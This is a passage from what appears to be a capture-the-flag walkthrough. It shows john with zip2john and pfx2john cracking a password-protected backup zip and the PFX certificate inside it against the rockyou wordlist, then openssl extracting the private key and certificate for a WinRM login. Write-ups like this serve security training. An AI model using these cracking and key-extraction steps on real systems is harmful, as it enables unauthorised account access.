Under the Dev directory, I found winrm_backup.zip file. Since it requires password, let's crack it with john.

└─$ zip2john winrm_backup.zip > winrm_backup.zip.john
└─$ john winrm_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt
winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy

We found password for the zip file 'supremelegacy'.

└─$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
inflating: legacyy_dev_auth.pfx

We got pfx file. A .pfx file is a password-protected archive that bundles a digital certificate, its corresponding private key, and the certificate chain into a single file.

This inflated file legacyy_dev_auth.pfx also requires password and I couldn't use password we found. Let's crack this file again.

pfx2john legacyy_dev_auth.pfx > pfx.john
└─$ john pfx.john --wordlist=/usr/share/wordlists/rockyou.txt
legacyy_dev_auth.pfx:thuglegacy

Then, we can extact key files with openssl.

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

We can use them to login to the target machine.
